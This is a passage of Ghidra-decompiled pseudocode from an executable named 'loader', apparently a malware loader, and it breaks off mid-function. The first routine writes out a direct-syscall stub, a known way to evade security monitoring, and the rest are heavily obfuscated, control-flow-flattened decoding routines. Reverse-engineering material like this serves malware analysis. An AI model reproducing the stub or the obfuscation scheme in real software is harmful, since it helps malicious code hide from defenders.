/* Ghidra-generated C-like pseudocode. Not original C/C++ source. */
/* Program: loader-0.745.0.7451137.exe */

/* ==================================================================== */
/* FUN_140001000 @ 140001000 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140001000(void)

{
  longlong lVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined2 local_10;
  undefined1 local_e;

  local_18 = 0xb8ca8949;
  local_14 = 0x26;
  local_10 = 0x50f;
  local_e = 0xc3;
  DAT_140a618d8 = (void *)FUN_14000e6b0(0xb);
  lVar1 = (longlong)DAT_140a618d8 + 0xb;
  DAT_140a618e0 = DAT_140a618d8;
  _DAT_140a618e8 = lVar1;
  memmove(DAT_140a618d8,&local_18,0xb);
  DAT_140a618e0 = (void *)lVar1;
  atexit((_func_5014 *)&LAB_140053370);
  return;
}



/* ==================================================================== */
/* FUN_140001070 @ 140001070 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140001070(void)

{
  byte bVar1;
  ulonglong uVar2;
  char cVar3;
  longlong lVar4;
  ulonglong uVar5;
  byte bVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  char cVar9;
  byte local_res8;
  int in_stack_0067fce9;
  int in_stack_0161d674;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;

  local_24 = 0;
  uStack_1c = 0;
  local_28 = 0x438b7fbe;
LAB_1400010a2:
  uVar2 = DAT_140a618c8;
  uVar7 = DAT_140a618d0;
LAB_1400010b0:
  uVar5 = 0;
  uVar8 = uVar7;
LAB_1400010b2:
  if (0x13 < uVar5) {
    _DAT_140a61938 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar5);
  cVar3 = (char)uVar5;
LAB_1400010c5:
  if (uVar5 < uVar2) {
    _DAT_140a61938 = (longlong)in_stack_0067fce9;
    return;
  }
  if (uVar8 + 1 <= uVar2) {
    if (uVar2 != uVar8 + 1) {
      if (uVar2 != uVar8 + 3) {
        if (uVar2 != uVar8 + 6) {
          if (uVar2 != uVar8 + 9) goto LAB_140001120;
          cVar9 = bVar1 + (cVar3 + 0xafU & bVar1) * -2 + -0x1a;
          goto LAB_1400019b1;
        }
        local_res8 = bVar1 + (cVar3 - 0xfU) + (cVar3 - 0xfU & bVar1) * -2 + 0x69;
        goto LAB_1400019f3;
      }
      local_res8 = bVar1 + cVar3 + 0x1dU + (cVar3 + 0x1dU & bVar1) * -2 + 0x35;
      goto LAB_140001a2e;
    }
    local_res8 = cVar3 + 0x5fU + bVar1 + (bVar1 & cVar3 + 0x5fU) * -2 + 0x67;
    uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
    goto LAB_1400010b2;
  }
  local_res8 = ('!' - (cVar3 + 0x75U & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_140001120:
  if (uVar5 < uVar8) {
    _DAT_140a61938 = (longlong)in_stack_0161d674;
    return;
  }
  if (uVar2 < uVar8 + 0x10) {
    local_res8 = ('5' - (cVar3 + 0x99U & bVar1)) * '\x02' + bVar1 + cVar3;
  }
  else {
    if (uVar2 == uVar8 + 1) {
      cVar9 = bVar1 + (cVar3 + 0x83U & bVar1) * -2 + -0x12;
      goto LAB_1400019b1;
    }
    if (uVar2 == uVar8 + 2) {
      local_res8 = (cVar3 + bVar1 + (cVar3 + 0x57U & bVar1) * -2) - 10;
      goto LAB_1400010b2;
    }
    if (uVar2 == uVar8 + 3) {
      local_res8 = ('=' - (cVar3 + 0x41U & bVar1)) * '\x02' + bVar1 + cVar3;
      goto LAB_1400019f3;
    }
  }
  while (uVar7 = uVar8, uVar5 < uVar8 + uVar2) {
    while( true ) {
      do {
        uVar8 = uVar7;
        if (uVar2 == uVar8 + 1) {
          cVar9 = ('.' - (cVar3 + 0x46U & bVar1)) * '\x02' + bVar1;
          goto LAB_1400019b1;
        }
        if (uVar2 == uVar8 + 0x40) {
          uVar8 = uVar8 + 1;
          local_res8 = (cVar3 + bVar1 + (cVar3 + 0x30U & bVar1) * -2) - 0x20;
          goto LAB_1400010b2;
        }
        if (uVar2 == uVar8 + 0x80) {
          local_res8 = ('2' - (cVar3 + 0x1aU & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_1400010b2;
        }
        if (uVar2 == uVar8 + 3) {
          local_res8 = bVar1 + (cVar3 + 4U & bVar1) * -2 + -0x18 + cVar3;
          goto LAB_1400019f3;
        }
        if (uVar2 == uVar8 + 100) {
          local_res8 = ('6' - (cVar3 - 0x12U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar2 = uVar2 + uVar8;
          goto LAB_140001a2e;
        }
        if (uVar2 == uVar8 + 1000) {
          local_res8 = (cVar3 + bVar1 + (cVar3 - 0x28U & bVar1) * -2) - 0x10;
          goto LAB_140001a2e;
        }
        if (uVar2 == uVar8 + 5) {
          cVar9 = (':' - (cVar3 - 0x3eU & bVar1)) * '\x02' + bVar1;
          goto LAB_1400018e2;
        }
        if (uVar2 == uVar8 + 0x200) {
          local_res8 = bVar1 + (cVar3 + 0xacU & bVar1) * -2 + -8 + cVar3;
          goto LAB_14000190c;
        }
        if (uVar2 == uVar8 + 0x1000) {
          local_res8 = ('>' - (cVar3 + 0x96U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
          goto LAB_1400010b2;
        }
        uVar7 = uVar8;
      } while (uVar2 == uVar8 + 8);
      uVar2 = uVar8 + 0x61;
      uVar7 = uVar8 + 0x461;
      if (uVar2 < uVar8 + 0x46a) {
        local_res8 = (bVar1 + cVar3 + (cVar3 - 0x21U & bVar1) * -2) - 0x3a;
        goto LAB_1400010a2;
      }
      if (uVar2 < uVar8 + 0x1461) {
        local_res8 = ('%' - (cVar3 - 0x37U & bVar1)) * '\x02' + cVar3 + bVar1;
        goto LAB_1400010b0;
      }
      if (uVar2 < uVar8 + 0x4a2) {
        local_res8 = bVar1 + (cVar3 + 0xb3U & bVar1) * -2 + -0x32 + cVar3;
        uVar8 = uVar7;
        goto LAB_1400010c5;
      }
      if (uVar2 < uVar8 + 0x471) {
        local_res8 = (')' - (cVar3 + 0x9dU & bVar1)) * '\x02' + bVar1 + cVar3;
        uVar8 = uVar7;
        goto LAB_140001120;
      }
      if (uVar2 < uVar8 + 0x4db) break;
      if (uVar2 < uVar8 + 0x48b) {
        bVar6 = cVar3 + 0x71;
        cVar9 = '-';
        uVar8 = uVar7;
        goto LAB_14000154a;
      }
      if (uVar2 < uVar8 + 0x489) {
        cVar9 = bVar1 + (cVar3 + 0x5bU & bVar1) * -2 + -0x22;
        uVar8 = uVar7;
        goto LAB_140001516;
      }
      if (uVar2 < uVar8 + 0x4bb) {
        bVar6 = cVar3 + 0x45;
        cVar9 = '1';
        uVar8 = uVar7;
        goto LAB_1400014d1;
      }
      if (uVar2 < uVar8 + 0x463) {
        local_res8 = (cVar3 + bVar1 + (cVar3 + 0x2fU & bVar1) * -2) - 0x1a;
        uVar8 = uVar7;
        goto LAB_1400014b9;
      }
      if (uVar8 + 0x4a3 <= uVar2) {
        uVar2 = uVar8 + 0x464;
        uVar7 = uVar8 + 0x465;
        if (uVar8 + 0x4c9 < uVar2) {
          local_res8 = ('\x18' - (cVar3 + 0x78U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar7 + 1;
          uVar8 = uVar7;
          goto LAB_1400010b2;
        }
        if (uVar8 + 0x467 < uVar2) {
          local_res8 = bVar1 + (cVar3 + 0x62U & bVar1) * -2 + -0x4c + cVar3;
          uVar8 = uVar7;
          goto LAB_14000190c;
        }
        if (uVar8 + 0x4a7 < uVar2) {
          cVar9 = ('\x1c' - (cVar3 + 0x4cU & bVar1)) * '\x02' + bVar1;
          uVar8 = uVar7;
          goto LAB_1400018e2;
        }
        if (uVar8 + 0x665 < uVar2) {
          local_res8 = cVar3 + bVar1 + (cVar3 + 0x36U & bVar1) * -2 + 0xbc;
          uVar8 = uVar7;
          goto LAB_140001a2e;
        }
        if (uVar8 + 0x469 < uVar2) {
          local_res8 = (' ' - (cVar3 + 0x20U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar2 = uVar2 + uVar7;
          uVar8 = uVar7;
          goto LAB_140001a2e;
        }
        if (uVar8 + 0x4e5 < uVar2) {
          local_res8 = bVar1 + (cVar3 + 10U & bVar1) * -2 + -0x3c + cVar3;
          uVar8 = uVar7;
          goto LAB_1400019f3;
        }
        if (uVar8 + 0x865 < uVar2) {
          local_res8 = ('$' - (cVar3 - 0xcU & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar8 = uVar7;
          goto LAB_1400010b2;
        }
        if (uVar8 + 0x46b < uVar2) {
          local_res8 = (cVar3 + bVar1 + (cVar3 - 0x22U & bVar1) * -2) - 0x34;
          uVar8 = uVar8 + 0x466;
          goto LAB_1400010b2;
        }
        if (uVar8 + 0x84d < uVar2) {
          cVar9 = ('(' - (cVar3 - 0x38U & bVar1)) * '\x02' + bVar1;
          uVar8 = uVar7;
          goto LAB_1400019b1;
        }
        if (uVar2 <= uVar8 + 0x4c6) {
          uVar2 = uVar8 + 0x865;
          uVar7 = uVar8 + 0x86e;
        }
      }
    }
    local_res8 = bVar1 + (cVar3 + 0x87U & bVar1) * -2 + -0x2a + cVar3;
    uVar8 = uVar7;
  }
  if (uVar8 + 3 <= uVar2) {
    if (uVar2 == uVar8 + 1) {
      local_res8 = (cVar3 + bVar1 + (cVar3 + 0x32U & bVar1) * -2) - 0x2c;
      uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
    }
    else {
      if (uVar2 == uVar8 + 3) {
        cVar9 = bVar1 + (cVar3 + 6U & bVar1) * -2 + -0x24;
        goto LAB_1400018e2;
      }
      if (uVar2 == uVar8 + 2) {
        local_res8 = (cVar3 + bVar1 + (cVar3 - 0x26U & bVar1) * -2) - 0x1c;
        uVar2 = uVar2 + uVar8;
LAB_140001a2e:
        uVar5 = uVar5 - local_res8;
      }
      else {
        if (uVar2 == uVar8 + 5) {
          local_res8 = ('4' - (cVar3 - 0x3cU & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_1400019f3;
        }
        if (uVar2 != uVar8 + 7) goto LAB_140001556;
        local_res8 = (cVar3 + bVar1 + (cVar3 + 0xaeU & bVar1) * -2) - 0x14;
      }
    }
    goto LAB_1400010b2;
  }
  bVar6 = cVar3 + 0x75;
  cVar9 = '!';
LAB_14000154a:
  local_res8 = (cVar9 - (bVar6 & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_140001556:
  if (uVar8 + uVar2 == 0x41) {
    cVar9 = ('*' - (cVar3 + 0x72U & bVar1)) * '\x02';
LAB_1400018e2:
    local_res8 = cVar9 + cVar3;
    bVar6 = (cVar3 - 0x19U) + (cVar3 - 0x19U & bVar1) * -2 + -0x51 + bVar1;
    *(byte *)((longlong)&local_28 + uVar5) = bVar6;
    uVar5 = uVar5 - ((ulonglong)bVar6 + uVar8 + 1);
    uVar8 = uVar8 + 1;
LAB_14000190c:
    bVar6 = (char)uVar5 + 0x5c;
    uVar2 = uVar2 + 1;
    *(byte *)((longlong)&local_28 + uVar5) = ('>' - (bVar6 & bVar1)) * '\x02' + bVar6 + bVar1;
    lVar4 = uVar5 + (-1 - uVar2);
    uVar5 = lVar4 + (&bStack_29)[lVar4 + 1] + uVar8 + 1;
    goto LAB_1400010b2;
  }
  if (uVar8 + 0x61 < uVar2) {
    cVar9 = bVar1 + (cVar3 - 0x1fU & bVar1) * -2 + -0x46;
LAB_140001516:
    local_res8 = cVar9 + cVar3;
LAB_140001519:
    if (4 < uVar2) {
      local_res8 = bVar1 * '\x02' + (cVar3 + 0x88U & bVar1) * -2 + -0x30 + cVar3;
LAB_1400019f3:
      *(byte *)((longlong)&local_28 + uVar5) =
           (cVar3 - 3U) + (cVar3 - 3U & bVar1) * -2 + '\x15' + bVar1 + local_res8;
      uVar2 = uVar2 + uVar8;
      goto LAB_140001a2e;
    }
    if (uVar8 + 3 < uVar2) {
      bVar6 = cVar3 + 0x7a;
      cVar9 = '\x12';
LAB_1400014d1:
      local_res8 = (cVar9 - (bVar6 & bVar1)) * '\x02' + bVar1 + cVar3;
    }
    else {
      if (uVar2 == uVar8 + 1) {
        local_res8 = cVar3 + bVar1 + (cVar3 + 100U & bVar1) * -2 + 0xa8;
        uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
        goto LAB_1400010b2;
      }
      if (uVar2 == uVar8 + 3) {
        cVar9 = bVar1 + (cVar3 + 0x38U & bVar1) * -2 + -0x50;
        goto LAB_1400018e2;
      }
      if (uVar2 == uVar8 + 2) {
        local_res8 = ('\x1a' - (cVar3 + 0x22U & bVar1)) * '\x02' + bVar1 + cVar3;
        goto LAB_140001a2e;
      }
    }
    if (uVar8 < 0x28) {
LAB_1400014b9:
      *(byte *)((longlong)&local_28 + uVar5) = local_res8;
      uVar5 = uVar5 + 1;
      goto LAB_1400010b2;
    }
    local_res8 = (bVar1 + (cVar3 + 0x9eU & bVar1) * -2 + cVar3) * '\x02' + 0x98;
  }
  else {
    if (uVar2 != uVar8 + 1) {
      if (uVar2 != uVar8 + 3) {
        if (uVar2 == uVar8 + 2) {
          local_res8 = bVar1 + (cVar3 + 0x89U & bVar1) * -2 + -0x36 + cVar3;
          goto LAB_1400019f3;
        }
        if (uVar2 == uVar8 + 5) {
          local_res8 = ('\'' - (cVar3 + 0x73U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar2 = uVar2 + uVar8;
          goto LAB_140001a2e;
        }
        if (uVar2 == uVar8 + 4) {
          cVar9 = ('+' - (cVar3 + 0x47U & bVar1)) * '\x02' + bVar1;
          goto LAB_1400018e2;
        }
        goto LAB_140001519;
      }
      local_res8 = ('#' - (cVar3 + 0x9fU & bVar1)) * '\x02' + bVar1 + cVar3;
      goto LAB_1400010b2;
    }
    cVar9 = ('\x1f' - (cVar3 - 0x35U & bVar1)) * '\x02' + bVar1;
LAB_1400019b1:
    local_res8 = cVar9 + cVar3;
  }
  *(byte *)((longlong)&local_28 + uVar5) =
       cVar3 + 0x13U + (cVar3 + 0x13U & bVar1) * -2 + '{' + bVar1;
  uVar8 = uVar8 + 1;
  goto LAB_1400010b2;
}



/* ==================================================================== */
/* FUN_140001ae0 @ 140001ae0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140001ae0(void)

{
  byte bVar1;
  ulonglong uVar2;
  byte bVar3;
  ulonglong uVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  char cVar8;
  byte bVar9;
  byte local_res8;
  int in_stack_011b0e33;
  int in_stack_0159ca0c;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined2 local_14;
  undefined1 local_12;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_12 = 0;
  local_28 = 0x3b3839fe;
LAB_140001b20:
  uVar2 = DAT_140a618c8;
  uVar6 = DAT_140a618d0;
LAB_140001b30:
  uVar4 = 0;
  uVar7 = uVar6;
LAB_140001b32:
  if (0x16 < uVar4) {
    _DAT_140a61958 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar4);
  bVar9 = (byte)uVar4;
LAB_140001b45:
  if (uVar4 < uVar2) {
    _DAT_140a61958 = (longlong)in_stack_011b0e33;
    return;
  }
  if (uVar7 + 1 <= uVar2) {
    if (uVar2 == uVar7 + 1) {
      local_res8 = (bVar9 + 0x75 + bVar1 + (bVar1 & bVar9 + 0x75) * -2) - 0x33;
      uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
    }
    else {
      if (uVar2 == uVar7 + 2) {
        bVar9 = bVar9 - 0x3d;
        cVar8 = bVar1 + (bVar1 & bVar9) * -2 + -0x55;
LAB_14000249f:
        local_res8 = cVar8 + bVar9;
        goto LAB_1400024a2;
      }
      if (uVar2 == uVar7 + 3) {
        local_res8 = bVar1 + (bVar9 - 5) + (bVar9 - 5 & bVar1) * -2 + 0x23;
        goto LAB_14000244e;
      }
      if (uVar2 != uVar7 + 5) goto LAB_140001ba0;
      bVar3 = bVar9 + 0x97;
      cVar8 = ';';
LAB_14000241b:
      local_res8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1 + bVar9;
      uVar7 = uVar7 + 1;
    }
    goto LAB_140001b32;
  }
  local_res8 = ('\v' - (bVar9 + 0x27 & bVar1)) * '\x02' + bVar1 + bVar9;
LAB_140001ba0:
  if (uVar4 < uVar7) {
    _DAT_140a61958 = (longlong)in_stack_0159ca0c;
    return;
  }
  if (uVar7 + 0x20 <= uVar2) {
    if (uVar2 == uVar7 + 1) {
      cVar8 = bVar1 + (bVar9 + 0x81 & bVar1) * -2 + -6;
      goto LAB_1400023e6;
    }
    if (uVar2 != uVar7 + 2) {
      if (uVar2 != uVar7 + 3) {
        if (uVar2 != uVar7 + 4) {
          if (uVar2 != uVar7 + 6) goto LAB_140001c10;
          local_res8 = ('-' - (bVar9 - 0xf & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
          goto LAB_140001b32;
        }
        local_res8 = bVar9 + bVar1 + (bVar9 + 0xb9 & bVar1) * -2 + 0xaa;
        goto LAB_14000246b;
      }
      local_res8 = ('?' - (bVar9 + 0x6b & bVar1)) * '\x02' + bVar1 + bVar9;
      goto LAB_14000244e;
    }
    local_res8 = (')' - (bVar9 + 0x1d & bVar1)) * '\x02' + bVar1 + bVar9;
    goto LAB_140001b32;
  }
  local_res8 = bVar1 + (bVar9 + 0x33 & bVar1) * -2 + -0x32 + bVar9;
LAB_140001c10:
  while (uVar6 = uVar7, uVar4 < uVar7 + uVar2) {
    while( true ) {
      do {
        uVar7 = uVar6;
        if (uVar2 == uVar7 + 0x41) {
          cVar8 = (':' - (bVar9 - 0x3e & bVar1)) * '\x02' + bVar1;
          goto LAB_1400023e6;
        }
        if (uVar2 == uVar7 + 0x42) {
          uVar7 = uVar7 + 1;
          local_res8 = bVar9 + bVar1 + (bVar9 + 0x10 & bVar1) * -2 + 0xa0;
          goto LAB_140001b32;
        }
        if (uVar2 == uVar7 + 5) {
          local_res8 = (bVar9 + bVar1 + (bVar9 + 0x5e & bVar1) * -2) - 0x34;
          goto LAB_140001b32;
        }
        if (uVar2 == uVar7 + 0x61) {
          local_res8 = bVar1 + (bVar9 + 0xac & bVar1) * -2 + -8 + bVar9;
          goto LAB_14000244e;
        }
        if (uVar2 == uVar7 + 0x28) {
          local_res8 = ('\x12' - (bVar9 - 6 & bVar1)) * '\x02' + bVar1 + bVar9;
          goto LAB_14000246b;
        }
        if (uVar2 == uVar7 + 3) {
          local_res8 = ('(' - (bVar9 + 0x48 & bVar1)) * '\x02' + bVar1 + bVar9;
          goto LAB_14000246e;
        }
        if (uVar2 == uVar7 + 0x400) {
          cVar8 = ('>' - (bVar9 + 0x96 & bVar1)) * '\x02' + bVar1;
          goto LAB_140002320;
        }
        if (uVar2 == uVar7 + 0x10) {
          cVar8 = bVar1 + (bVar9 - 0x1c & bVar1) * -2 + -0x58;
          goto LAB_14000249f;
        }
        if (uVar2 == uVar7 + 1) {
          local_res8 = (bVar9 + bVar1 + (bVar9 + 0x32 & bVar1) * -2) - 0x2c;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
          goto LAB_140001b32;
        }
        uVar6 = uVar7;
      } while (uVar2 == uVar7 + 0x200);
      uVar2 = uVar7 + 0x2a;
      uVar6 = uVar7 + 0x33;
      if (uVar2 < uVar7 + 0xb3) {
        local_res8 = ('!' - (bVar9 - 0xb & bVar1)) * '\x02' + bVar9 + bVar1;
        goto LAB_140001b20;
      }
      if (uVar2 < uVar7 + 0x3b) {
        local_res8 = ('7' - (bVar9 + 0x43 & bVar1)) * '\x02' + bVar9 + bVar1;
        goto LAB_140001b30;
      }
      if (uVar2 < uVar7 + 0x74) {
        local_res8 = bVar1 + (bVar9 + 0x91 & bVar1) * -2 + -0x66 + bVar9;
        uVar7 = uVar6;
        goto LAB_140001b45;
      }
      if (uVar2 < uVar7 + 0x75) {
        local_res8 = bVar1 + (bVar9 - 0x21 & bVar1) * -2 + -0x3a + bVar9;
        uVar7 = uVar6;
        goto LAB_140001ba0;
      }
      if (uVar2 < uVar7 + 0x38) break;
      if (uVar2 < uVar7 + 0x94) {
        bVar3 = bVar9 + 0x7b;
        cVar8 = '\x0f';
        uVar7 = uVar6;
        goto LAB_140001fc7;
      }
      if (uVar2 < uVar7 + 0x5b) {
        bVar3 = bVar9 - 0x37;
        cVar8 = '%';
        uVar7 = uVar6;
        goto LAB_140001f88;
      }
      if (uVar2 < uVar7 + 0x36) {
        bVar3 = bVar9 + 0x17;
        cVar8 = ';';
        uVar7 = uVar6;
        goto LAB_140001f4b;
      }
      if (uVar2 < uVar7 + 0x433) {
        local_res8 = bVar9 + bVar1 + (bVar9 + 0x65 & bVar1) * -2 + 0xa2;
        uVar7 = uVar6;
        goto LAB_140001f33;
      }
      if (uVar7 + 0x43 <= uVar2) {
        uVar2 = uVar7 + 0x41b;
        uVar6 = uVar7 + 0x41c;
        if (uVar7 + 0x426 < uVar2) {
          local_res8 = ('\b' - (bVar9 + 0x28 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar6 + 1;
          uVar7 = uVar6;
          goto LAB_140001b32;
        }
        if (uVar7 + 0x446 < uVar2) {
          cVar8 = ('\x1e' - (bVar9 + 0x76 & bVar1)) * '\x02' + bVar1;
          uVar7 = uVar6;
          goto LAB_14000249f;
        }
        if (uVar7 + 0x49c < uVar2) {
          cVar8 = ('4' - (bVar9 - 0x3c & bVar1)) * '\x02' + bVar1;
          uVar7 = uVar6;
          goto LAB_140002320;
        }
        if (uVar7 + 0x424 < uVar2) {
          local_res8 = bVar9 + bVar1 + (bVar9 + 0x12 & bVar1) * -2 + 0x94;
          uVar7 = uVar6;
          goto LAB_14000246e;
        }
        if (uVar7 + 0x45d < uVar2) {
          local_res8 = (bVar9 + bVar1 + (bVar9 + 0x60 & bVar1) * -2) - 0x40;
          uVar7 = uVar6;
          goto LAB_14000246b;
        }
        if (uVar7 + 0x45e < uVar2) {
          local_res8 = bVar1 + (bVar9 + 0xae & bVar1) * -2 + -0x14 + bVar9;
          uVar7 = uVar6;
          goto LAB_14000244e;
        }
        if (uVar7 + 0x421 < uVar2) {
          local_res8 = ('\f' - (bVar9 - 4 & bVar1)) * '\x02' + bVar1 + bVar9;
          uVar7 = uVar6;
          goto LAB_140001b32;
        }
        if (uVar7 + 0x47d < uVar2) {
          bVar3 = bVar9 + 0x4a;
          cVar8 = '\"';
          uVar7 = uVar6;
          goto LAB_14000241b;
        }
        if (uVar7 + 0x444 < uVar2) {
          cVar8 = ('8' - (bVar9 + 0x98 & bVar1)) * '\x02' + bVar1;
          uVar7 = uVar6;
          goto LAB_1400023e6;
        }
        if (uVar2 <= uVar7 + 0x41f) {
          uVar2 = uVar7 + 0x43c;
          uVar6 = uVar7 + 0x83c;
        }
      }
    }
    local_res8 = bVar1 + (bVar9 + 0x2d & bVar1) * -2 + -0xe + bVar9;
    uVar7 = uVar6;
  }
  if (uVar7 + 0x61 <= uVar2) {
    if (uVar2 == uVar7 + 1) {
      local_res8 = bVar9 + bVar1 + (bVar9 + 0x66 & bVar1) * -2 + 0x9c;
      uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
    }
    else {
      if (uVar2 == uVar7 + 3) {
        cVar8 = bVar1 + (bVar9 + 2 & bVar1) * -2 + -0xc;
        goto LAB_140002320;
      }
      if (uVar2 != uVar7 + 5) {
        if (uVar2 != uVar7 + 9) goto LAB_140001fd3;
        cVar8 = bVar1 + (bVar9 - 0x2a & bVar1) * -2 + -4;
        goto LAB_1400023e6;
      }
      local_res8 = ('<' - (bVar9 - 0x14 & bVar1)) * '\x02' + bVar1 + bVar9;
LAB_14000244e:
      *(byte *)((longlong)&local_28 + uVar4) =
           (bVar9 - 1) + (bVar9 - 1 & bVar1) * -2 + '\a' + bVar1 + local_res8;
LAB_14000246b:
      uVar2 = uVar2 + uVar7;
LAB_14000246e:
      uVar4 = uVar4 - local_res8;
    }
    goto LAB_140001b32;
  }
  bVar3 = bVar9 + 0x27;
  cVar8 = '\v';
LAB_140001fc7:
  local_res8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1 + bVar9;
LAB_140001fd3:
  if (uVar7 + uVar2 == 0x41) {
    cVar8 = ('\x0e' - (bVar9 + 0x26 & bVar1)) * '\x02';
LAB_140002320:
    local_res8 = cVar8 + bVar9;
    uVar7 = uVar7 + 1;
    bVar9 = bVar9 + 0x4d + (bVar9 + 0x4d & bVar1) * -2 + -0x1b + bVar1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar9;
    uVar4 = uVar4 - (bVar9 + uVar7);
LAB_1400024a2:
    bVar9 = (char)uVar4 + 0x74;
    uVar2 = uVar2 + 1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar1 + (bVar1 & bVar9) * -2 + -0x2c + bVar9;
    lVar5 = uVar4 + (-1 - uVar2);
    uVar4 = lVar5 + (&bStack_29)[lVar5 + 1] + uVar7 + 1;
    goto LAB_140001b32;
  }
  if (uVar7 + 6 < uVar2) {
    bVar3 = bVar9 + 0x4b;
    cVar8 = '\x1f';
LAB_140001f88:
    local_res8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1 + bVar9;
LAB_140001f94:
    if (0x7f < uVar2) {
      local_res8 = bVar1 * '\x02' + (bVar9 - 0x28 & bVar1) * -2 + -0x10 + bVar9;
      goto LAB_14000244e;
    }
    if (uVar7 + 0x5a < uVar2) {
      bVar3 = bVar9 + 0x7e;
      cVar8 = '\x06';
LAB_140001f4b:
      local_res8 = (cVar8 - (bVar3 & bVar1)) * '\x02' + bVar1 + bVar9;
    }
    else {
      if (uVar2 == uVar7 + 1) {
        local_res8 = ('\x1c' - (bVar9 - 0x34 & bVar1)) * '\x02' + bVar1 + bVar9;
        uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
        goto LAB_140001b32;
      }
      if (uVar2 == uVar7 + 3) {
        cVar8 = bVar1 + (bVar9 + 0x68 & bVar1) * -2 + -0x70;
        goto LAB_140002320;
      }
      if (uVar2 == uVar7 + 5) {
        local_res8 = (bVar9 + bVar1 + (bVar9 + 4 & bVar1) * -2) - 0x18;
        goto LAB_14000246b;
      }
      if (uVar2 == uVar7 + 2) {
        cVar8 = bVar1 + (bVar9 + 0x3c & bVar1) * -2 + -0x68;
        goto LAB_1400023e6;
      }
    }
    if (uVar7 < 10) {
LAB_140001f33:
      *(byte *)((longlong)&local_28 + uVar4) = local_res8;
      uVar4 = uVar4 + 1;
      goto LAB_140001b32;
    }
    local_res8 = (bVar1 + (bVar9 + 0x8a & bVar1) * -2 + bVar9) * '\x02' + 0x88;
  }
  else {
    if (uVar2 != uVar7 + 1) {
      if (uVar2 != uVar7 + 2) {
        if (uVar2 != uVar7 + 3) {
          if (uVar2 == uVar7 + 7) {
            cVar8 = ('9' - (bVar9 + 0x6d & bVar1)) * '\x02' + bVar1;
            goto LAB_140002320;
          }
          goto LAB_140001f94;
        }
        local_res8 = ('\r' - (bVar9 - 0x2f & bVar1)) * '\x02' + bVar1 + bVar9;
        goto LAB_14000246b;
      }
      local_res8 = (bVar9 + bVar1 + (bVar9 + 0x35 & bVar1) * -2) - 0x3e;
      goto LAB_140001b32;
    }
    cVar8 = ('5' - (bVar9 + 0x99 & bVar1)) * '\x02' + bVar1;
LAB_1400023e6:
    local_res8 = cVar8 + bVar9;
  }
  *(byte *)((longlong)&local_28 + uVar4) = bVar9 + 0xb1 + (bVar9 + 0xb1 & bVar1) * -2 + ')' + bVar1;
  uVar7 = uVar7 + 1;
  goto LAB_140001b32;
}



/* ==================================================================== */
/* FUN_140002570 @ 140002570 */

void FUN_140002570(void)

{
  byte bVar1;
  ulonglong uVar2;
  char cVar3;
  ulonglong uVar4;
  longlong lVar5;
  char cVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  byte bVar9;
  byte local_res8;
  int in_stack_011b0d86;
  int in_stack_0159c960;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined2 local_14;
  undefined1 local_12;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_12 = 0;
  local_28 = 0x23712cbf;
LAB_1400025b0:
  uVar2 = DAT_140a618c8;
  uVar7 = DAT_140a618d0;
LAB_1400025c0:
  uVar4 = 0;
  uVar8 = uVar7;
LAB_1400025c2:
  if (0x16 < uVar4) {
    DAT_140a61990 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar4);
  cVar3 = (char)uVar4;
LAB_1400025d5:
  if (uVar4 < uVar2) {
    DAT_140a61990 = (longlong)in_stack_011b0d86;
    return;
  }
  if (uVar8 + 1 <= uVar2) {
    if (uVar2 == uVar8 + 1) {
      local_res8 = (bVar1 + cVar3 + 0x72U + (cVar3 + 0x72U & bVar1) * -2) - 0x1e;
      uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar8 + 1;
    }
    else {
      if (uVar2 == uVar8 + 2) {
        local_res8 = bVar1 + cVar3 + 10U + (cVar3 + 10U & bVar1) * -2 + 0xba;
        goto LAB_140002fef;
      }
      if (uVar2 == uVar8 + 3) {
